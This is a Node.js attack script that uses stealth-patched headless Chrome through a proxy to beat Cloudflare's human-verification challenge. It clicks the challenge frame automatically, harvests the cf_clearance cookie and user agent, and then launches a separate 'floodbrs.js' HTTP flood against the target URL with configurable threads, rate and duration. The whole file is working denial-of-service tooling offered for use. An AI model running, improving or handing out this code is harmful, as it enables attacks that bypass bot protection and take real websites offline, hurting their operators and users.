const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Enhanced stealth configuration based on simple.py approach
const applyUltimateStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Remove all automation detection
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        
        // Enhanced plugin spoofing
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {
                    name: 'Chrome PDF Plugin',
                    filename: 'internal-pdf-viewer',
                    description: 'Portable Document Format'
                },
                {
                    name: 'Chrome PDF Viewer',
                    filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai',
                    description: 'Portable Document Format'
                }
            ]
        });

        // Language spoofing
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en', 'id-ID', 'id']
        });

        // Enhanced Chrome mocking
        window.chrome = {
            runtime: {
                connect: () => ({
                    onMessage: { addListener: () => {} },
                    postMessage: () => {},
                    onDisconnect: { addListener: () => {} }
                }),
                sendMessage: () => {},
                onMessage: { addListener: () => {} },
                onConnect: { addListener: () => {} },
                getManifest: () => ({}),
                id: 'testid'
            },
            loadTimes: () => ({
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0,
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                navigationType: 'Reload',
                wasFetchedViaSpdy: true,
                wasNpnNegotiated: true,
                npnNegotiatedProtocol: 'h2',
                connectionInfo: 'h2'
            }),
            csi: () => ({
                onloadT: Date.now(),
                startE: Date.now() - 1000,
                pageT: 1200,
                tran: 15
            }),
            app: {
                isInstalled: false,
                InstallState: {
                    DISABLED: 'disabled',
                    INSTALLED: 'installed',
                    NOT_INSTALLED: 'not_installed'
                },
                RunningState: {
                    CANNOT_RUN: 'cannot_run',
                    READY_TO_RUN: 'ready_to_run',
                    RUNNING: 'running'
                }
            }
        };

        // Hardware spoofing
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0 });

        // Document properties
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });

        // Remove all automation traces
        const automationProps = [
            '__webdriver_evaluate',
            '__selenium_evaluate',
            '__webdriver_script_function',
            '__webdriver_script_func',
            '__webdriver_script_fn',
            '_Selenium_IDE_Recorder',
            '_selenium',
            'callPhantom',
            'callSelenium',
            'phantom',
            'webdriver',
            'selenium',
            '_phantom'
        ];
        automationProps.forEach(prop => delete window[prop]);
    });
};

// Browser args from simple.py approach
const getBrowserArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-infobars',
    '--start-maximized',
    '--lang=en-US,en;q=0.9',
    '--window-size=1920,1080',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process,TranslateUI',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-background-timer-throttling',
    '--user-data-dir=/tmp/puppeteer'
];

// SIMPLE.PY APPROACH - PASSIVE WAIT WITH FRAME CLICK
const solveCloudflareSimple = async (page, proxy, targetURL) => {
    log('SOLVER', `Starting simple.py approach for ${maskProxy(proxy)}`, 'BLUE');
    
    let title = await page.title().catch(() => '');
    let currentUrl = page.url();
    
    log('DEBUG', `Initial - Title: "${title}", URL: ${currentUrl}`, 'YELLOW');

    // Check if already passed
    if (!title.includes('Just a moment') && 
        !title.includes('Checking your browser') &&
        !currentUrl.includes('challenges.cloudflare.com')) {
        log('SUCCESS', 'Already bypassed!', 'GREEN');
        return { solved: true, method: 'already_passed' };
    }

    log('INFO', 'Cloudflare challenge detected', 'YELLOW');

    // SIMPLE.PY STRATEGY: Passive wait with frame click
    log('STRATEGY', 'Passive wait with frame click (30 seconds max)', 'BLUE');
    
    const maxWaitTime = 30; // 30 seconds max
    const waitInterval = 2; // Check every 2 seconds
    
    for (let waitCycle = 0; waitCycle < maxWaitTime / waitInterval; waitCycle++) {
        await sleep(waitInterval);
        
        title = await page.title().catch(() => '');
        currentUrl = page.url();
        const frames = await page.frames();
        
        log('WAIT', `${waitCycle * waitInterval}s - Title: "${title}" | Frames: ${frames.length}`, 'YELLOW');
        
        // Check if challenge completed
        if (!title.includes('Just a moment') && 
            !title.includes('Checking your browser') &&
            !currentUrl.includes('challenges.cloudflare.com')) {
            log('SUCCESS', 'Challenge completed during passive wait!', 'GREEN');
            return { solved: true, method: 'passive_wait' };
        }
        
        // If challenge frame found, click once in the center
        let challengeFrameFound = false;
        for (const frame of frames) {
            try {
                const frameUrl = frame.url();
                if (frameUrl.includes('challenges.cloudflare.com')) {
                    if (!challengeFrameFound) { // Only click once per cycle
                        log('ACTION', 'Clicking challenge frame center...', 'YELLOW');
                        try {
                            const frameElement = await frame.frameElement();
                            const box = await frameElement.boundingBox();
                            if (box) {
                                // Click in the center of the frame (simple.py approach)
                                const clickX = box.x + box.width / 2;
                                const clickY = box.y + box.height / 2;
                                await page.mouse.click(clickX, clickY);
                                challengeFrameFound = true;
                                log('SUCCESS', `Clicked frame at ${clickX}, ${clickY}`, 'GREEN');
                            }
                        } catch (error) {
                            log('ERROR', `Frame click failed: ${error.message}`, 'RED');
                        }
                    }
                }
            } catch (error) {
                // Continue to next frame
            }
        }
    }
    
    // Wait additional time for cookies (simple.py approach)
    log('INFO', 'Waiting for cookies...', 'BLUE');
    await sleep(5);
    
    // Final check
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Challenge solved after additional wait!', 'GREEN');
        return { solved: true, method: 'additional_wait' };
    }

    log('ERROR', 'Simple approach failed', 'RED');
    return { solved: false, method: 'simple_failed' };
};

// ENHANCED SOLVER WITH FALLBACK STRATEGIES
const solveCloudflareEnhanced = async (page, proxy, targetURL) => {
    // Try simple.py approach first
    const simpleResult = await solveCloudflareSimple(page, proxy, targetURL);
    if (simpleResult.solved) {
        return simpleResult;
    }

    log('INFO', 'Simple approach failed, trying enhanced strategies...', 'YELLOW');

    // FALLBACK STRATEGY 1: Text-based checkbox detection
    log('STRATEGY', 'Text-based checkbox detection', 'BLUE');
    
    const frames = await page.frames();
    for (const frame of frames) {
        try {
            const frameUrl = frame.url();
            if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
                log('DEBUG', 'Found challenge frame', 'YELLOW');
                
                // Look for challenge texts
                const challengeTexts = [
                    'Verify you are human',
                    'Buktikan bahwa Anda adalah manusia',
                    'Prove you are human',
                    'Confirm you are human',
                    'Verify you are human by completing',
                    'I am human'
                ];

                for (const text of challengeTexts) {
                    try {
                        const xpath = `//*[contains(text(), '${text}') or contains(., '${text}')]`;
                        const textElements = await frame.$x(xpath);
                        
                        if (textElements.length > 0) {
                            log('SUCCESS', `Found challenge text: "${text}"`, 'GREEN');
                            
                            for (const textElement of textElements) {
                                const textBox = await textElement.boundingBox();
                                if (textBox) {
                                    // Click left of the text (checkbox position)
                                    const checkboxX = textBox.x - 50;
                                    const checkboxY = textBox.y + textBox.height / 2;
                                    
                                    await page.mouse.click(checkboxX, checkboxY);
                                    log('SUCCESS', `Clicked at checkbox position`, 'GREEN');
                                    
                                    await sleep(15);
                                    
                                    const title = await page.title().catch(() => '');
                                    if (!title.includes('Just a moment')) {
                                        log('SUCCESS', 'Text-based click solved!', 'GREEN');
                                        return { solved: true, method: 'text_based' };
                                    }
                                    break;
                                }
                            }
                        }
                    } catch (error) {
                        // Continue to next text
                    }
                }
                break;
            }
        } catch (error) {
            // Continue to next frame
        }
    }

    // FALLBACK STRATEGY 2: Coordinate clicking
    log('STRATEGY', 'Coordinate clicking', 'BLUE');
    
    const viewport = page.viewport();
    const centerX = viewport.width / 2;
    const centerY = viewport.height / 2;
    
    const positions = [
        { x: centerX - 150, y: centerY, desc: 'Left' },
        { x: centerX - 100, y: centerY, desc: 'Near left' },
        { x: centerX, y: centerY, desc: 'Center' },
        { x: centerX + 100, y: centerY, desc: 'Right' }
    ];

    for (const position of positions) {
        try {
            await page.mouse.click(position.x, position.y);
            log('CLICK', `Clicked at ${position.desc}`, 'YELLOW');
            
            await sleep(10);
            
            const title = await page.title().catch(() => '');
            if (!title.includes('Just a moment')) {
                log('SUCCESS', `Coordinate click solved at ${position.desc}!`, 'GREEN');
                return { solved: true, method: 'coordinate' };
            }
        } catch (error) {
            // Continue to next position
        }
    }

    log('ERROR', 'All enhanced strategies failed', 'RED');
    return { solved: false, method: 'enhanced_failed' };
};

// EXTRACT COOKIES (SIMPLE.PY APPROACH)
const extractCookies = async (page, targetURL) => {
    await sleep(5);
    
    // Get all cookies
    const allCookies = await page.cookies().catch(() => []);
    
    if (allCookies.length === 0) {
        log('COOKIES', 'No cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }

    log('DEBUG', `Found ${allCookies.length} cookies:`, 'GREEN');
    allCookies.forEach(cookie => {
        log('DEBUG', `- ${cookie.name}: ${cookie.value.substring(0, 30)}...`, 'YELLOW');
    });

    // Look for cf_clearance first (simple.py priority)
    const cfClearance = allCookies.find(cookie => cookie.name === 'cf_clearance');
    
    if (cfClearance) {
        log('SUCCESS', 'cf_clearance found!', 'GREEN');
        const cookieString = `cf_clearance=${cfClearance.value}`;
        return {
            cookies: cookieString,
            count: 1,
            names: [cfClearance.name]
        };
    }

    // Fallback to any Cloudflare cookies
    const cloudflareCookies = allCookies.filter(cookie => 
        cookie.name.includes('cf_') ||
        cookie.name.includes('__cf') ||
        cookie.domain.includes('cloudflare')
    );

    if (cloudflareCookies.length > 0) {
        const bestCookie = cloudflareCookies[0];
        log('FALLBACK', `Using ${bestCookie.name} as alternative`, 'YELLOW');
        const cookieString = `${bestCookie.name}=${bestCookie.value}`;
        return {
            cookies: cookieString,
            count: 1,
            names: [bestCookie.name]
        };
    }

    log('ERROR', 'No Cloudflare cookies found', 'RED');
    return { cookies: '', count: 0, names: [] };
};

// Command-line setup
if (process.argv.length < 6) {
    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    console.log('Example: node browser.js https://example.com 2 proxies.txt 10 120');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(16);

const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return [proxies[0]]; // Use first proxy only
    } catch (error) {
        log('ERROR', 'Cannot read proxy file', 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    console.log(`${colorCode}[${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
];

// Browser launcher with simple.py approach
const launchBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getBrowserArgs()
        ],
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply stealth
        await applyUltimateStealth(page);

        // Set headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        });

        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
        
        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 60000 
        }).catch(() => {});

        // Solve Cloudflare with simple.py approach first
        const solveResult = await solveCloudflareEnhanced(page, proxy, targetURL);
        
        if (!solveResult.solved) {
            throw new Error(`Cloudflare challenge failed: ${solveResult.method}`);
        }

        // Extract cookies (simple.py approach)
        const cookieResult = await extractCookies(page, targetURL);
        
        // Get user agent
        const finalUserAgent = await page.evaluate(() => navigator.userAgent);
        
        successCount++;
        log('SUCCESS', `Solved via ${solveResult.method}!`, 'GREEN');

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent: finalUserAgent,
            cookieCount: cookieResult.count,
            cookieNames: cookieResult.names,
            method: solveResult.method
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < 5) { // Increased to 5 attempts like simple.py
            log('RETRY', `Retrying (${attempt}/5)...`, 'YELLOW');
            await sleep(8);
            return launchBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
        return null;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No proxies found', 'RED');
        process.exit(1);
    }

    log('START', `Target: ${targetURL}`, 'GREEN');
    log('INFO', `Using 1 proxy | Flood threads: ${threads} | Time: ${duration}s | Rate: ${rate}`, 'BLUE');

    const proxy = proxies[0];
    let cookie = null;
    let userAgent = null;
    const maxAttempts = 5;

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        log('ATTEMPT', `Attempt ${attempt} to solve Cloudflare`, 'BLUE');
        const result = await launchBrowser(targetURL, proxy, attempt);
        
        if (result && result.cookies) {
            cookie = result.cookies;
            userAgent = result.userAgent;
            log('SUCCESS', `Cloudflare solved on attempt ${attempt}`, 'GREEN');
            break;
        }
        
        log('RETRY', `Retry after failure...`, 'RED');
    }

    if (!cookie || !userAgent) {
        log('ERROR', `Failed to solve Cloudflare after ${maxAttempts} attempts`, 'RED');
        return;
    }

    log('RESULT', `cf_clearance: ${cookie}`, 'GREEN');
    log('RESULT', `User-Agent: ${userAgent}`, 'GREEN');
    log('FLOOD', `Starting flooder for ${duration} seconds...`, 'GREEN');

    // Launch flood process
    try {
        log('FLOOD', `Starting flood with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
        const floodProcess = spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            threads.toString(),
            proxyFile,
            cookie,
            userAgent,
            validKey
        ], {
            detached: false,
            stdio: 'inherit'
        });
        
        floodProcess.on('close', (code) => {
            log('FLOOD', `Flood process completed`, 'YELLOW');
            process.exit(0);
        });
        
    } catch (error) {
        log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
    }
};

// Error handling
process.on('uncaughtException', (error) => {
    log('CRASH', error.message, 'RED');
});

process.on('unhandledRejection', (error) => {
    log('REJECTION', error.message, 'RED');
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

log('READY', 'SIMPLE.PY APPROACH - PASSIVE WAIT WITH FRAME CLICK', 'GREEN');
main().catch(error => {
    log('ERROR', error.message, 'RED');
    process.exit(1);
});
